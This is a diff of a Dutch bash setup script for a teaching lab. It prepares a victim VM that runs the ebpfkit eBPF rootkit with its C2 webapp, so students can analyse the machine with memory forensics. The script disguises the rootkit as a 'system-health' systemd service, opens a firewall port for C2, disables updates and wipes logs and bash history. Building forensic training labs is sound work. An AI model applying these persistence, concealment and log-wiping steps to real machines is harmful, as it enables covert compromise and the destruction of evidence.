@@ -1,27 +1,36 @@
 #!/bin/bash
 # ============================================================================
-# ebpfkit Rootkit Lab - Docentensetup Script
+# ebpfkit Rootkit Lab - Slachtoffer Setup Script (met C2)
 # ============================================================================
-# Dit script bereidt de VM volledig voor zodat studenten enkel nog
-# hoeven in te loggen en te analyseren. Voer dit uit op de VM als
+# Dit script bereidt de SLACHTOFFER-VM volledig voor zodat studenten enkel
+# nog hoeven in te loggen en te analyseren. Voer dit uit op de VM als
 # de 'student' gebruiker (met sudo-rechten).
+#
+# Wijzigingen t.o.v. origineel:
+#   - Statisch IP 192.168.56.101 (host-only netwerk)
+#   - ebpfkit gestart MET webapp (-w vlag) op poort 8080 voor C2-demo
+#   - Systemd service start ook de webapp
+#   - Firewall (ufw) laat poort 8080 toe vanuit host-only subnet
 #
 # Volgorde:
 #   1. APT repositories aanpassen (Ubuntu 20.04 Focal)
 #   2. Dependencies installeren (Go, clang/llvm 11, go-bindata)
-#   3. ebpfkit compileren & laden
-#   4. Persistentie instellen
-#   5. LiME installeren (kernel module vooraf compileren)
-#   6. Volatility 3 installeren
-#   7. ISF-profiel genereren & installeren
-#   8. Sporen verwijderen
-#   9. Verificatie
+#   3. Statisch IP instellen
+#   4. ebpfkit compileren & laden (met webapp)
+#   5. Persistentie instellen
+#   6. ISF-profiel genereren & installeren
+#   7. Kernel versie vastzetten
+#   8. RAM dump maken
+#   9. Sporen verwijderen
+#  10. Verificatie
 # ============================================================================
 
-set -e  # Stop bij eerste fout
+set -e
+
+VICTIM_IP="192.168.56.101"
+WEBAPP_PORT="8080"
 
 echo "=== STAP 1: APT Repositories Controleren ==="
-# Ubuntu 20.04 (Focal) is nog ondersteund — standaard repositories werken
 sudo apt update
 
 echo ""
@@ -48,7 +57,8 @@ sudo apt install -y \
     python3 \
     python3-pip \
     golang-go \
-    graphviz
+    graphviz \
+    ufw
 
 # Zorg dat clang-11 de standaard clang is
 sudo update-alternatives --install /usr/bin/clang clang /usr/bin/clang-11 100
@@ -68,13 +78,38 @@ echo "Python: $(python3 --version)"
 echo "Go:     $(go version)"
 
 echo ""
-echo "=== STAP 4: ebpfkit Downloaden en Compileren ==="
+echo "=== STAP 4: Statisch IP Instellen (host-only netwerk) ==="
+# Detecteer de host-only adapter (tweede interface in VirtualBox, doorgaans enp0s8)
+# Pas aan als 'ip a' een andere naam toont.
+IFACE=$(ip -o link show | awk -F': ' '{print $2}' | grep -v lo | tail -1)
+echo "Gevonden netwerkinterface: $IFACE"
+
+sudo tee /etc/netplan/01-hostonly.yaml > /dev/null << EOF
+network:
+  version: 2
+  ethernets:
+    ${IFACE}:
+      addresses:
+        - ${VICTIM_IP}/24
+EOF
+
+sudo netplan apply
+echo "Statisch IP ingesteld: ${VICTIM_IP}"
+
+echo ""
+echo "=== STAP 5: Firewall — Poort ${WEBAPP_PORT} Openstellen ==="
+# Alleen bereikbaar vanuit het host-only subnet (192.168.56.0/24)
+sudo ufw allow from 192.168.56.0/24 to any port ${WEBAPP_PORT} proto tcp comment "ebpfkit C2 webapp"
+sudo ufw --force enable
+echo "UFW regel toegevoegd: poort ${WEBAPP_PORT} open voor 192.168.56.0/24"
+
+echo ""
+echo "=== STAP 6: ebpfkit Downloaden en Compileren ==="
 cd /opt
 sudo git clone https://github.com/Gui774ume/ebpfkit.git
 sudo chown -R $(whoami):$(whoami) /opt/ebpfkit
 cd /opt/ebpfkit
 
-# PATH uitbreiden zodat go-bindata gevonden wordt
 export PATH=$PATH:$(go env GOPATH)/bin
 
 # Compileren (genereert bin/ebpfkit, bin/webapp, bin/ebpfkit-client)
@@ -84,20 +119,24 @@ echo "Gebouwde binaries:"
 ls -lh bin/
 
 echo ""
-echo "=== STAP 5: Rootkit Laden ==="
+echo "=== STAP 7: Rootkit Laden (met C2 webapp) ==="
 cd /opt/ebpfkit
+# -w start de ingebouwde webapp op poort 8080 (C2-interface)
 # ebpfkit verbergt zichzelf standaard voor bpf syscall
-sudo ./bin/ebpfkit &
+sudo ./bin/ebpfkit -w &
 sleep 3
-echo "ebpfkit gestart (achtergrond PID: $!)"
+echo "ebpfkit gestart met webapp (achtergrond PID: $!)"
+echo "C2 webapp bereikbaar op http://${VICTIM_IP}:${WEBAPP_PORT}"
 
 echo ""
-echo "=== STAP 6: Persistentie Instellen ==="
-# Binary kopiëren naar een onopvallende locatie
+echo "=== STAP 8: Persistentie Instellen ==="
+# Binaries kopiëren naar onopvallende locaties
 sudo cp /opt/ebpfkit/bin/ebpfkit /usr/local/bin/.system-health
+sudo cp /opt/ebpfkit/bin/webapp   /usr/local/bin/.system-health-ui
 sudo chmod +x /usr/local/bin/.system-health
+sudo chmod +x /usr/local/bin/.system-health-ui
 
-# Systemd service aanmaken
+# Systemd service aanmaken (start ebpfkit MET webapp)
 sudo tee /etc/systemd/system/system-health.service > /dev/null << 'EOF'
 [Unit]
 Description=System Health Monitor
@@ -105,7 +144,8 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/local/bin/.system-health
+# -w: start de ingebouwde webapp (C2-interface) op poort 8080
+ExecStart=/usr/local/bin/.system-health -w
 Restart=always
 RestartSec=5
 
@@ -117,13 +157,13 @@ sudo systemctl daemon-reload
 sudo systemctl enable system-health.service
 sudo systemctl start system-health.service
 echo "Persistentie ingesteld via systemd service: system-health.service"
+echo "C2 webapp actief op http://${VICTIM_IP}:${WEBAPP_PORT}"
 
 echo ""
-echo "=== STAP 7: ISF-profiel Genereren voor Volatility ==="
+echo "=== STAP 9: ISF-profiel Genereren voor Volatility ==="
 KERNEL_VERSION=$(uname -r)
 echo "Kernelversie: $KERNEL_VERSION"
 
-# Ubuntu 20.04 Focal: debug symbols via apt
 echo "Debug symbols downloaden..."
 echo "deb http://ddebs.ubuntu.com focal main restricted universe multiverse" | \
     sudo tee /etc/apt/sources.list.d/ddebs.list
@@ -140,7 +180,6 @@ sudo apt install ubuntu-dbgsym-keyring
 sudo apt update
 sudo apt install linux-image-$(uname -r)-dbgsym
 
-
 VMLINUX="/usr/lib/debug/boot/vmlinux-${KERNEL_VERSION}"
 SYSTEM_MAP="/boot/System.map-${KERNEL_VERSION}"
 
@@ -150,14 +189,12 @@ if [ ! -f "$VMLINUX" ]; then
 fi
 echo "vmlinux gevonden: $VMLINUX"
 
-# dwarf2json bouwen
 echo "dwarf2json bouwen..."
 cd /tmp
 git clone https://github.com/volatilityfoundation/dwarf2json.git
 cd dwarf2json
 go build .
 
-# ISF-profiel genereren (5-15 minuten, ~8GB RAM nodig)
 echo "ISF-profiel genereren (kan 5-15 min duren)..."
 PROFILE_NAME="linux-ubuntu-focal-${KERNEL_VERSION}.json"
 
@@ -168,6 +205,8 @@ PROFILE_NAME="linux-ubuntu-focal-${KERNEL_VERSION}.json"
 
 echo "ISF-profiel gegenereerd: $(du -h /tmp/${PROFILE_NAME})"
 
+echo ""
+echo "=== STAP 10: Kernel Versie Vastzetten ==="
 # echo "=== STAP 7: LiME Installeren (kernel module vooraf compileren) ==="
 # # LiME moet exact gecompileerd worden voor de draaiende kernel.
 # # Door dit nu te doen, hoeven studenten zelf niets te compileren.
@@ -188,60 +227,63 @@ sudo apt-mark hold linux-image-5.15.0-179-generic
 sudo apt-mark hold linux-headers-5.15.0-179-generic
 sudo apt-mark hold linux-modules-5.15.0-179-generic
 sudo apt-mark hold linux-modules-extra-5.15.0-179-generic
-
-# 2. Zet de generic meta-packages vast (dit voorkomt dat Ubuntu een nieuwere kernelversie trekt)
 sudo apt-mark hold linux-image-generic
 sudo apt-mark hold linux-headers-generic
 
-# Schakel automatische apt-updates uit
 sudo sed -i 's/APT::Periodic::Update-Package-Lists "1";/APT::Periodic::Update-Package-Lists "0";/' /etc/apt/apt.conf.d/20auto-upgrades
 sudo sed -i 's/APT::Periodic::Unattended-Upgrade "1";/APT::Periodic::Unattended-Upgrade "0";/' /etc/apt/apt.conf.d/20auto-upgrades
 
-# Stop en disable de service
 sudo systemctl stop unattended-upgrades
 sudo systemctl disable unattended-upgrades
 
-echo "=== STAP 9: Ram dump maken ==="
+echo ""
+echo "=== STAP 11: RAM Dump Maken ==="
 ./VBoxManage list runningvms
 ./VBoxManage controlvm "ebpfkit" pause
 ./VBoxManage debugvm "ebpfkit" dumpvmcore --filename="C:\Users\username\Downloads\memory_dump.elf"
 ./VBoxManage controlvm "ebpfkit" resume
 
 echo ""
-echo "=== STAP 10: Sporen Verwijderen ==="
-# ebpfkit broncode verwijderen (binary staat al in /usr/local/bin/.system-health)
+echo "=== STAP 12: Sporen Verwijderen ==="
 sudo rm -rf /opt/ebpfkit
-
-# dwarf2json en build artifacts verwijderen
 sudo rm -rf /tmp/dwarf2json
 sudo rm -f "/tmp/${PROFILE_NAME}"
 
-# Debug symbols verwijderen (bespaart ~500MB schijfruimte)
 sudo apt remove -y "linux-image-${KERNEL_VERSION}-dbgsym" 2>/dev/null || true
 sudo rm -f /etc/apt/sources.list.d/ddebs.list
 sudo apt update > /dev/null 2>&1
 
-# Logs opschonen
 sudo journalctl --vacuum-time=1s
 sudo truncate -s 0 /var/log/syslog 2>/dev/null || true
 sudo truncate -s 0 /var/log/auth.log 2>/dev/null || true
 sudo truncate -s 0 /var/log/kern.log 2>/dev/null || true
 
-# APT cache opschonen
 sudo apt autoremove -y && sudo apt clean
 dd if=/dev/zero of=/tmp/zero.small.file bs=1M || true
 rm /tmp/zero.small.file
 sync
-# Bash history wissen
 history -c
 cat /dev/null > ~/.bash_history
 
+echo ""
+echo "=== STAP 13: Verificatie ==="
+
+echo "--- Statisch IP actief? ---"
+ip a | grep "${VICTIM_IP}" && echo "OK: IP ${VICTIM_IP} actief" || echo "FOUT: IP niet ingesteld!"
 
 echo ""
-echo "=== STAP 11: Verificatie ==="
-
 echo "--- Rootkit actief? ---"
 systemctl is-active system-health.service && echo "OK: ebpfkit service actief" || echo "FOUT: ebpfkit service niet actief!"
+
+echo ""
+echo "--- C2 webapp bereikbaar? ---"
+curl -s --max-time 3 "http://${VICTIM_IP}:${WEBAPP_PORT}" > /dev/null && \
+    echo "OK: Webapp reageert op poort ${WEBAPP_PORT}" || \
+    echo "FOUT: Webapp niet bereikbaar op poort ${WEBAPP_PORT}!"
+
+echo ""
+echo "--- UFW regel aanwezig? ---"
+sudo ufw status | grep "${WEBAPP_PORT}" && echo "OK: Firewall regel actief" || echo "FOUT: Firewall regel ontbreekt!"
 
 echo ""
 echo "--- lsmod (mag niets verdachts tonen) ---"
@@ -250,12 +292,6 @@ lsmod | head -20
 echo ""
 echo "--- bpftool (rootkit verbergt zichzelf standaard) ---"
 sudo bpftool prog list 2>/dev/null | head -20 || echo "(bpftool niet beschikbaar of verborgen)"
-
-echo ""
-echo "--- LiME kernel module aanwezig? ---"
-ls /opt/LiME/src/lime-$(uname -r).ko > /dev/null 2>&1 && \
-    echo "OK: LiME module aanwezig (/opt/LiME/src/lime-$(uname -r).ko)" || \
-    echo "FOUT: LiME module ontbreekt!"
 
 echo ""
 echo "--- Volatility 3 aanwezig? ---"
@@ -271,11 +307,14 @@ ls /opt/volatility3/volatility3/symbols/linux/*.json > /dev/null 2>&1 && \
 
 echo ""
 echo "============================================================================"
-echo "KLAAR! De VM is volledig geconfigureerd voor de studenten."
+echo "KLAAR! De slachtoffer-VM is volledig geconfigureerd voor de studenten."
+echo ""
+echo "C2 webapp bereikbaar vanop aanvaller-VM:"
+echo "  http://${VICTIM_IP}:${WEBAPP_PORT}"
 echo ""
 echo "Volgende stap: sluit de VM af en exporteer als .ova:"
 echo "  sudo shutdown -h now"
-echo "  VBoxManage export \"ebpfkit-Lab\" -o ebpfkit-Lab.ova"
+echo "  VBoxManage export \"ebpfkit-Slachtoffer\" -o ebpfkit-Slachtoffer.ova"
 echo ""
 echo "Studenten hoeven enkel nog in te loggen en de opdracht te volgen."
 echo "============================================================================"
